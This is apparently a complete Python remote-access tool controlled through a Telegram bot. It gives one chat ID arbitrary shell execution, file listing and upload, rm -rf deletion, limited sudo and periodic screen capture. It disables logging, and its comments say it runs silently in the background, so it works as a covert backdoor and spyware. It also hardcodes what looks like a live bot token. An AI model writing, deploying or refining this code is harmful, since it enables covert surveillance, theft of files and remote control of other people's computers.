import shlex
import subprocess
import tempfile
import os
import asyncio
from functools import wraps
from telegram import Update, InputFile
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import mss
import logging

# ===== CONFIG =====
BOT_TOKEN = "7884689370:AAF8Yqr08Yy5G9ZqvlzyWwnKnjP-JgMlORo"  # Replace with your bot token
ALLOWED_CHAT_ID = 8406913795  # Replace with your numeric Telegram chat ID
# ==================

# Disable all logging
logging.getLogger().disabled = True

# ===== Access Restriction =====
def restricted(func):
    @wraps(func)
    async def wrapped(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        chat_id = update.effective_chat.id if update.effective_chat else None
        if chat_id != ALLOWED_CHAT_ID:
            return
        return await func(update, context, *args, **kwargs)
    return wrapped

# ===== Helpers =====
def run_shell_command(cmd, timeout=20):
    try:
        completed = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return completed.returncode, completed.stdout, completed.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Command timed out"
    except Exception as e:
        return -1, "", f"Exception: {e}"

async def send_text_or_file(context: ContextTypes.DEFAULT_TYPE, chat_id: int, text: str, filename_prefix="output"):
    if not text:
        text = "(no output)"
    if len(text) < 4000:
        message = f"```\n{text}\n```"
        await context.bot.send_message(chat_id=chat_id, text=message, parse_mode="MarkdownV2")
    else:
        with tempfile.NamedTemporaryFile(mode="w+", delete=False, prefix=filename_prefix, suffix=".txt") as tf:
            tf.write(text)
            tempname = tf.name
        with open(tempname, "rb") as fh:
            await context.bot.send_document(chat_id=chat_id, document=InputFile(fh, filename=os.path.basename(tempname)))
        try:
            os.unlink(tempname)
        except Exception:
            pass

# ===== Command Handlers =====
@restricted
async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "Available commands:\n"
        "/help - show this message\n"
        "/ls <path> - list files\n"
        "/tree <path> - recursive directory list\n"
        "/cat <file> - read file\n"
        "/rm <path> - remove file/folder\n"
        "/run <command> - run shell command\n"
        "/open <program> - open program\n"
        "/sudo <command> - safe sudo command\n"
        "/screenshot - take screenshot\n"
        "/start_screenshots <seconds> - periodic screenshots\n"
        "/stop_screenshots - stop periodic screenshots\n"
        "/pwd - current directory\n"
        "/whoami - current user\n"
    )
    await update.message.reply_text(help_text)

@restricted
async def ls_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    path = " ".join(context.args) if context.args else "."
    code, out, err = run_shell_command(f"ls -la {shlex.quote(path)}")
    await send_text_or_file(context, update.effective_chat.id, out if code == 0 else err or out)

@restricted
async def tree_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    path = " ".join(context.args) if context.args else "."
    code, out, err = run_shell_command(f"tree -L 3 {shlex.quote(path)}")
    await send_text_or_file(context, update.effective_chat.id, out if code == 0 else err or out)

@restricted
async def cat_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /cat <file>")
        return
    path = " ".join(context.args)
    if not os.path.exists(path):
        await update.message.reply_text("File not found")
        return
    size = os.path.getsize(path)
    if size > 5 * 1024 * 1024:
        await update.message.reply_text("File too large (over 5MB).")
        return
    with open(path, "rb") as f:
        await context.bot.send_document(chat_id=update.effective_chat.id, document=InputFile(f, filename=os.path.basename(path)))

@restricted
async def rm_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /rm <path>")
        return
    path = " ".join(context.args)
    if path in ("/", "") or path.startswith("/etc"):
        await update.message.reply_text("Refusing to delete sensitive paths.")
        return
    code, out, err = run_shell_command(f"rm -rf {shlex.quote(path)}", timeout=30)
    await send_text_or_file(context, update.effective_chat.id, f"Return code: {code}\n{out}\n{err}")

@restricted
async def run_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /run <command>")
        return
    cmd = " ".join(context.args)
    code, out, err = run_shell_command(cmd, timeout=60)
    await send_text_or_file(context, update.effective_chat.id, f"Return code: {code}\n{out}\n{err}")

@restricted
async def open_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /open <program>")
        return
    prog = " ".join(context.args)
    code, out, err = run_shell_command(f"{shlex.quote(prog)} &", timeout=10)
    await send_text_or_file(context, update.effective_chat.id, f"Return code: {code}\n{out}\n{err}")

@restricted
async def sudo_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /sudo <command>")
        return
    cmd = " ".join(context.args)
    allowed = ["apt", "systemctl", "service"]  # only safe sudo commands
    if not any(cmd.startswith(a) for a in allowed):
        await update.message.reply_text("Command not allowed with sudo")
        return
    code, out, err = run_shell_command(f"sudo {cmd}", timeout=60)
    await send_text_or_file(context, update.effective_chat.id, f"Return code: {code}\n{out}\n{err}")

@restricted
async def pwd_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code, out, err = run_shell_command("pwd")
    await send_text_or_file(context, update.effective_chat.id, out if code == 0 else err or out)

@restricted
async def whoami_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code, out, err = run_shell_command("whoami")
    await send_text_or_file(context, update.effective_chat.id, out if code == 0 else err or out)

# ===== Screenshot Handling =====
screenshot_task = None
screenshot_task_stop = False

async def take_and_send_screenshot(context: ContextTypes.DEFAULT_TYPE, chat_id: int):
    with mss.mss() as sct:
        sct.shot(mon=-1, output="screenshot.png")
    with open("screenshot.png", "rb") as fh:
        await context.bot.send_photo(chat_id=chat_id, photo=fh)
    try:
        os.remove("screenshot.png")
    except Exception:
        pass

@restricted
async def screenshot_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await take_and_send_screenshot(context, update.effective_chat.id)

@restricted
async def start_screenshots_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global screenshot_task, screenshot_task_stop
    if not context.args:
        await update.message.reply_text("Usage: /start_screenshots <seconds>")
        return
    try:
        interval = float(context.args[0])
    except ValueError:
        await update.message.reply_text("Invalid interval")
        return
    if interval < 1:
        await update.message.reply_text("Interval too small")
        return
    screenshot_task_stop = False

    async def periodic(chat_id, interval):
        while not screenshot_task_stop:
            await take_and_send_screenshot(context, chat_id)
            await asyncio.sleep(interval)

    if screenshot_task is None or screenshot_task.done():
        screenshot_task = asyncio.create_task(periodic(update.effective_chat.id, interval))

@restricted
async def stop_screenshots_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global screenshot_task_stop, screenshot_task
    screenshot_task_stop = True
    if screenshot_task:
        screenshot_task.cancel()
    screenshot_task = None

# ===== Main =====
def main():
    if BOT_TOKEN.startswith("REPLACE"):
        return

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    # Command handlers
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("ls", ls_cmd))
    app.add_handler(CommandHandler("tree", tree_cmd))
    app.add_handler(CommandHandler("cat", cat_cmd))
    app.add_handler(CommandHandler("rm", rm_cmd))
    app.add_handler(CommandHandler("run", run_cmd))
    app.add_handler(CommandHandler("open", open_cmd))
    app.add_handler(CommandHandler("sudo", sudo_cmd))
    app.add_handler(CommandHandler("pwd", pwd_cmd))
    app.add_handler(CommandHandler("whoami", whoami_cmd))
    app.add_handler(CommandHandler("screenshot", screenshot_cmd))
    app.add_handler(CommandHandler("start_screenshots", start_screenshots_cmd))
    app.add_handler(CommandHandler("stop_screenshots", stop_screenshots_cmd))

    # Run silently in background
    app.run_polling(close_loop=False)

if __name__ == "__main__":
    main()
